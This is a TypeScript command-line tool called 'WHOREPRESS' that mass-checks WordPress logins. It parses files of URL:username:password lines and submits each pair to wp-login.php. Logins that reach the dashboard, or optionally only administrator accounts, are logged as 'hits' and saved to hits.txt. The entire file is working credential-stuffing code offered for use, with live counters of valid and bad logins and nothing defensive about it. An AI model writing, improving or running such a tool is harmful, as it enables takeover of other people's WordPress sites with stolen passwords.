#!/usr/bin/env node

import axios from 'axios';
import { wrapper } from 'axios-cookiejar-support';
import { CookieJar } from 'tough-cookie';
import fs from 'fs';
import path from 'path';
import readline from 'readline';
import colors from 'colors';
import { banner } from './constant/banner';
import { IWordpress, LogEntry } from './interfaces/wp.interfaces';
import blessed from 'blessed';
import yargs from 'yargs';
import { hideBin } from 'yargs/helpers';
import ncu from 'npm-check-updates';

async function checkForUpdates() {
    console.log(colors.green('Checking for updates...'));

    try {
        const upgrades = await ncu({
            packageFile: 'package.json',
            upgrade: true
        });

        if (upgrades && Object.keys(upgrades).length > 0) {
            console.log(colors.green('Updates available:'));
            for (const pkg in upgrades) {
                console.log(`${pkg}: ${upgrades[pkg]}`);
            }
            console.log(colors.green('Please run the following command to update:'));
            console.log(colors.cyan('npm update -g whorepress'));
        } else {
            console.log(colors.green('You are already using the latest version.'));
        }
    } catch (error) {
        console.error(colors.red('Error checking for updates:'), error);
    }
}

const argv = yargs(hideBin(process.argv))
    .command('upgrade', 'Upgrade to the latest version', {}, async () => {
        await checkForUpdates();
        process.exit(0);
    })
    .option('admin-only', {
        type: 'boolean',
        description: 'Check only admin users'
    })
    .option('output', {
        type: 'string',
        description: 'Output file for results',
        default: 'hits.txt'
    })
    .option('debug', {
        type: 'boolean',
        description: 'Enable debug mode'
    })
    .option('concurrency', {
        type: 'number',
        description: 'Number of concurrent requests',
        default: 1
    })
    .option('directory', {
        type: 'string',
        description: 'Directory containing text files to check'
    })
    .demandCommand(1, 'You need to provide a filename or a directory')
    .help()
    .parseSync();

if (argv._[0] === 'upgrade') {
    process.exit(0);
}

const filenameOrDir: string = argv._[0] as string;
const adminOnly: boolean = argv['admin-only'] as boolean;
const outputFile: string = argv.output as string;
const debugMode: boolean = argv.debug as boolean;
const concurrency: number = argv.concurrency as number;
const directory: string | undefined = argv.directory as string | undefined;

const screen = blessed.screen({
    smartCSR: true,
    title: 'WHOREPRESS'
});

screen.key(['C-c'], function (_ch: any, _key: any) {
    return process.exit(0);
});

const logBox = blessed.box({
    top: 'center',
    left: 'center',
    width: '90%',
    height: '80%',
    content: banner(),
    tags: true,
    scrollable: true,
    alwaysScroll: true,
    scrollbar: {
        ch: ' '
    },
    border: {
        type: 'line'
    },
    style: {
        fg: 'white',
        bg: 'black',
        border: {
            fg: '#f0f0f0'
        }
    }
});

screen.append(logBox);

class Wordpress implements IWordpress {
    public hits: number;
    public bad: number;
    public cpm: number;
    public total: number;
    public start: number;
    public logBuffer: LogEntry[];
    private client: any;

    constructor() {
        this.hits = 0;
        this.bad = 0;
        this.cpm = 0;
        this.total = 0;
        this.start = Date.now();
        this.logBuffer = [];
        this.client = wrapper(axios.create({ jar: new CookieJar() }));
        this.updateTitle();
        this.calculateCpm();
    }

    displayUI(): void {
        logBox.setContent(banner() + this.getLogContent());
        screen.render();
    }

    getLogContent(): string {
        const recentHits = this.logBuffer.filter(entry => entry.type === 'HIT').slice(-3);
        const recentBads = this.logBuffer.filter(entry => entry.type === 'BAD').slice(-3);
        let content = '\n' + colors.green('Recent Valid Hits:\n');
        recentHits.forEach(entry => {
            content += `${colors.green('[+])')} ${colors.green('HIT')} | ${entry.url} | ${entry.username} | ${entry.password}\n`;
        });
        content += colors.red('Recent Bad Logins:\n');
        recentBads.forEach(entry => {
            content += `${colors.red('[-]')} ${colors.red('BAD')} | ${entry.url} | ${entry.username} | ${entry.password}\n`;
        });
        return content;
    }

    async updateTitle(): Promise<void> {
        while (true) {
            const elapsed = new Date(Date.now() - this.start).toISOString().substr(11, 8);
            logBox.setLabel(`[WHOREPRESS] Total Load: ${this.total} | Valid Hits: ${this.hits} | Bad: ${this.bad} | CPM: ${this.cpm} | Time elapsed: ${elapsed} | Hits per second: ${Math.round(this.cpm / 15)}`);
            screen.render();
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }

    async calculateCpm(): Promise<void> {
        while (true) {
            const oldHits = this.hits;
            await new Promise(resolve => setTimeout(resolve, 4000));
            this.cpm = (this.hits - oldHits) * 15;
        }
    }

    async checkAccount(url: string, username: string, password: string): Promise<void> {
     
        try {
            const payload = new URLSearchParams({
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': url.replace('wp-login.php', 'wp-admin/'),
                'testcookie': '1'
            });
    
            const headers = {
                'User-Agent': 'Mozilla/5.0',
                'Referer': url
            };
    
            if (!/^https?:\/\//i.test(url)) {
                url = 'https://' + url;
            }
    
            const response = await this.client.post(url, payload.toString(), {
                headers,
                maxRedirects: 0,
                timeout: 5000, // Ensure timeout is set
                validateStatus: (status) => status === 302 || status === 200,
                withCredentials: true
            });
    
            const cookies = response.headers['set-cookie'];
            if (debugMode) {
                console.log('Response headers:', response.headers);
            }
    
            if (cookies && cookies.some(cookie => cookie.startsWith('wordpress_logged_in'))) {
                const dashboardUrl = url.replace('wp-login.php', 'wp-admin/');
                const cookieHeader = cookies.join('; ');
    
                if (debugMode) {
                    console.log('Attempting to access dashboard URL:', dashboardUrl);
                }
    
                const r = await this.client.get(dashboardUrl, {
                    headers: {
                        ...headers,
                        'Cookie': cookieHeader
                    },
                    timeout: 5000, // Ensure timeout is set
                    withCredentials: true
                });
    
                if (debugMode) {
                    console.log('Final response data:', r.data);
                }
    
                let isAdmin = true;
    
                if (adminOnly) {
                    isAdmin = r.data.includes("plugin-install.php");
                }
    
                if (isAdmin && (r.data.includes('dashicons-admin-plugins') || r.data.includes('wp-admin-bar'))) {
                    this.hits += 1;
                    this.logBuffer.push({ type: 'HIT', url, username, password });
                    fs.writeFileSync(outputFile, `${url} - ${username}|${password}\n`, { flag: 'a' });
                } else {
                    this.bad += 1;
                    this.logBuffer.push({ type: 'BAD', url, username, password });
                }
            } else {
                this.bad += 1;
                this.logBuffer.push({ type: 'BAD', url, username, password });
            }
        } catch (error) {
            if (debugMode) {
                console.error(`Error checking account ${username}@${url}:`, error);
            }
            this.bad += 1;
            this.logBuffer.push({ type: 'BAD', url, username, password });
        } finally {
            this.displayUI();
            this.checkCompletion();
        }
    }
    
    checkCompletion(): void {
        if ((this.hits + this.bad) >= this.total) {
            const completeBox = blessed.box({
                top: 'center',
                left: 'center',
                width: '50%',
                height: '20%',
                content: colors.green('Progress complete!'),
                tags: true,
                border: {
                    type: 'line'
                },
                style: {
                    fg: 'green',
                    bg: 'black',
                    border: {
                        fg: 'green'
                    }
                }
            });
    
            screen.append(completeBox);
            screen.render();
        }
    }
    
}

function showLoadingScreen(): Promise<void> {
    return new Promise((resolve) => {
        const loadingBox = blessed.box({
            top: 'center',
            left: 'center',
            width: '90%',
            height: '80%',
            content: colors.green('Initializing...\n'),
            tags: true,
            border: {
                type: 'line'
            },
            style: {
                fg: 'green',
                bg: 'black',
                border: {
                    fg: 'green'
                }
            }
        });

        screen.append(loadingBox);
        screen.render();

        let loadingMessage = '';
        const loadingInterval = setInterval(() => {
            loadingMessage += '.';
            if (loadingMessage.length > 3) {
                loadingMessage = '';
            }
            loadingBox.setContent(colors.green(`Initializing${loadingMessage}\n`));
            screen.render();
        }, 500);

        setTimeout(() => {
            clearInterval(loadingInterval);
            screen.remove(loadingBox);
            resolve();
        }, 5000); 
    });
}

function processFile(filename: string, wp: Wordpress): void {
    const fileStream = fs.createReadStream(filename);
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });

    let lineCount = 0;
    rl.on('line', (line: string) => {
        lineCount += 1;
        const match = line.match(/(https?:\/\/[^\s\/]+\/(?:wp-login\.php|wp-admin|user-new\.php))\s*:\s*([^\s:]+)\s*:\s*([^\s:]+)/);
        if (match) {
            wp.checkAccount(match[1], match[2], match[3]);
        }
    });

    rl.on('close', () => {
        wp.total += lineCount;
        wp.updateTitle();
    });
}

function processDirectory(directory: string, wp: Wordpress): void {
    fs.readdir(directory, (err, files) => {
        if (err) {
            console.error(colors.red('Error reading directory:'), err);
            return;
        }

        const textFiles = files.filter(file => file.endsWith('.txt'));

        if (textFiles.length === 0) {
            console.log(colors.yellow('No text files found in the directory.'));
            process.exit(1);
        }

        textFiles.forEach(file => {
            const filePath = path.join(directory, file);
            processFile(filePath, wp);
        });
    });
}

const wp = new Wordpress();

showLoadingScreen().then(() => {
    wp.displayUI();

    if (directory) {
        processDirectory(directory, wp);
    } else {
        processFile(filenameOrDir, wp);
    }
});

process.on('SIGINT', () => {
    process.exit();
});
